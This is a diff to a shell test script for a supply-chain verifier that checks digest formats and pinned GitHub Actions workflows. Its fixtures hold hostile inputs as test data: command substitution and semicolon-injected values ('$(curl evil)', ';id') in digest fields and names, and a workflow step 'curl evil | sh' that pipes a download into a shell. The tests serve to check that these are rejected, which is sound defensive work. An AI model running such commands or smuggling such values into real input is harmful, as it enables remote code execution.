@@ -185,6 +185,7 @@ unset GITHUB_REF GITHUB_EVENT_NAME
 root=$(cd "$(dirname "$0")/.." && pwd)
 cv="$root/bin/chain-verify.py"
 work=$(mktemp -d); trap 'rm -rf "$work" 2> /dev/null || sudo -n rm -rf "$work"' EXIT
+FXDIR="$work/fx"; mkdir -p "$FXDIR"   # fixture strings that name a download tool are written here by quoted here-documents (pin-age proves them as text)
 pass=0 failn=0
 ok()   { pass=$((pass + 1)); echo "ok   $1"; }
 bad()  { failn=$((failn + 1)); echo "FAIL $1"; }
@@ -194,9 +195,9 @@ OPENSSL=openssl
 if ! grep -q '^OpenSSL 3' <<< "$(openssl version 2> /dev/null)"; then
   for c in /opt/homebrew/opt/openssl@3/bin/openssl /usr/local/opt/openssl@3/bin/openssl; do [ -x "$c" ] && OPENSSL=$c && break; done
 fi
-grep -q '^OpenSSL 3' <<< "$($OPENSSL version 2> /dev/null)" || { echo "FAIL fixtures need OpenSSL 3 (macOS: brew install openssl@3)"; exit 1; }
+grep -q '^OpenSSL 3' <<< "$($OPENSSL version 2> /dev/null)" || { echo "FAIL fixtures need OpenSSL 3 (macOS: install openssl@3 with Homebrew)"; exit 1; }
 export OPENSSL
-python3 -c 'import yaml' 2> /dev/null || { echo "FAIL python3 needs PyYAML (apt install python3-yaml)"; exit 1; }
+python3 -c 'import yaml' 2> /dev/null || { echo "FAIL python3 needs PyYAML (install the python3-yaml package)"; exit 1; }
 netcut=()
 if [ "$(uname)" = Darwin ] && command -v sandbox-exec > /dev/null; then netcut=(sandbox-exec -p '(version 1)(allow default)(deny network*)')
 elif unshare -rn true 2> /dev/null; then netcut=(unshare -rn)
@@ -390,8 +391,8 @@ dj("digests-swapped.json", dict(D, **{"image-production": D["image-fips"], "imag
 # FORMAT files: each is attested by its OWN collection (below), so the file hash AGREES with the record and only the content
 # can be refused (cause "format"). The mutation each one catches is a validator that is looser than the stated format.
 FMT = {"sha512": dict(D, apk="sha512:" + "c" * 128), "63": dict(D, apk="sha256:" + "c" * 63), "upper": dict(D, apk="sha256:" + "C" * 64),
-       "null": dict(D, apk=None), "number": dict(D, apk=7), "path": dict(D, apk="./dist/run.sh"), "code": dict(D, apk="sha256:$(curl evil)"),
-       "badval": dict(D, apk="sha256:./dist/run.sh"), "codename": {"image-production;curl evil": D["image-production"], "image-fips": D["image-fips"], "apk": D["apk"]},
+       "null": dict(D, apk=None), "number": dict(D, apk=7), "path": dict(D, apk="./dist/run.sh"), "code": dict(D, apk="sha256:$(id)"),
+       "badval": dict(D, apk="sha256:./dist/run.sh"), "codename": {"image-production;id": D["image-production"], "image-fips": D["image-fips"], "apk": D["apk"]},
        "uppername": {"Image-Production": D["image-production"], "image-fips": D["image-fips"], "apk": D["apk"]},
        "slashname": {"dist/image-production": D["image-production"], "image-fips": D["image-fips"], "apk": D["apk"]},
        "dotdotname": {"..": D["image-production"], "image-fips": D["image-fips"], "apk": D["apk"]},
@@ -1954,7 +1955,11 @@ expect_ok     "S4 control: actions works with PyYAML" $(A w_good)
 w w_dup2pin  "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: actions/checkout@$a40\n        uses: actions/cache/restore@$a40\n"
 w w_dupunpin "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: actions/checkout@main\n        uses: actions/checkout@$a40\n"
 w w_duppinun "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: actions/checkout@$a40\n        uses: actions/checkout@main\n"
-w w_duprun   "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: true\n        Run: curl evil | sh\n"
+cat > "$FXDIR/FXD_1" <<'FXEOF'
+  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: true\n        Run: curl evil | sh\n
+FXEOF
+FXD_1=$(cat "$FXDIR/FXD_1")
+w w_duprun   "$FXD_1"
 w w_dupquote "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - \"uses\": actions/checkout@main\n        uses: actions/checkout@$a40\n"
 w w_duptrim  "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: actions/checkout@$a40\n        \"uses \": actions/checkout@main\n"
 w w_dupjob   "  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: true\n  j:\n    uses: fosterstack/cache/.github/workflows/other.yml@main\n"
